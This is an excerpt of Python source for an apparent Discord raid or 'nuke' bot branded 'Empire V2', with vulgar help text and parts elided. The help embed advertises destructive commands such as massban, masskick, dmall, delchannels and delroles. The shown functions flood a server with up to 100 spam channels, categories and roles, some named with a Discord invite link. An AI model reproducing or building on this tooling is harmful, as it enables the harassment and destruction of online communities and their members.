...
async def help(ctx):
 ...
 embed.set_author(name="Prefix='Suck My Dick'", icon_url="https://media.discordapp.net/attachments/715346152895283361/715681269119320074/image0.gif")
 embed.set_thumbnail(url="https://media.discordapp.net/attachments/715346152895283361/715681269119320074/image0.gif")

 embed.add_field(name="__**>Empire V2<**__", value="When you see this, yo shit getting laced", inline=True)
 ...
 embed.add_field(name="**•REG SHIT**", value="*rainbow(role), tinyurl(url), clear, upper(msg), genname, speak(msg), abc, devowel, combine(msg + msg) fm(firstmsg)*", inline=True)
 embed.add_field(name="**•LACE THAT SHIT**", value="*wizz, dmall(msg), massban, masskick, massunban, masschannel, massrole, delroles, delchannels, rc(name), servername(name), nickall(name)*",
 inline=False)
...
async def wizz(ctx): # b'\xfc'
    ...
    try:
        ...
        pass        
    for _i in range(10):
        await ctx.guild.create_text_channel(name="discord.gg/foriegner")
        await ctx.guild.create_voice_channel(name="discord.gg/foriegner")
        await ctx.guild.create_category(name="discord.gg/foriegner")
...
async def masschannels(ctx): # b'\xfc'
    ...
    for _i in range(100):
        try:
            await ctx.guild.create_text_channel(name="bye bitch")
        except:
            return            
...
async def massrole(ctx): # b'\xfc'
    ...
    for _i in range(100):
        try:
            await ctx.guild.create_role(name="nukesquad")
        except:
            return    
